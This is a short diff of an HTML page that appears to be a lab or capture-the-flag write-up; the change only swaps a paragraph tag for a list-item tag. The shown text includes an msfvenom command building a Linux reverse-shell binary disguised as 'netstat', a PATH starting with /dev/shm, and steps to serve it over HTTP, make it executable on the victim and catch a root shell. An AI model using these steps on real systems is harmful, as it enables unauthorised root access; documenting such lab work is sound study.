@@ -331,7 +331,7 @@ PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.248 LPORT=80 -f elf -o netstat
     </pre>
 
-    <p>Now I setup a web server on Kali using "python3 -m http.server 80" and then download the file to the victim using wget.  Once I place this file in /dev/shm I set the permissions so it is executable using "chmod +x /dev/shm/netstat".  After that I open a listener up on port 80 on Kali and wait.  Eventually I receive a root shell.</p>
+    <li>Now I setup a web server on Kali using "python3 -m http.server 80" and then download the file to the victim using wget.  Once I place this file in /dev/shm I set the permissions so it is executable using "chmod +x /dev/shm/netstat".  After that I open a listener up on port 80 on Kali and wait.  Eventually I receive a root shell.</li>
 
 </body>
 </html>
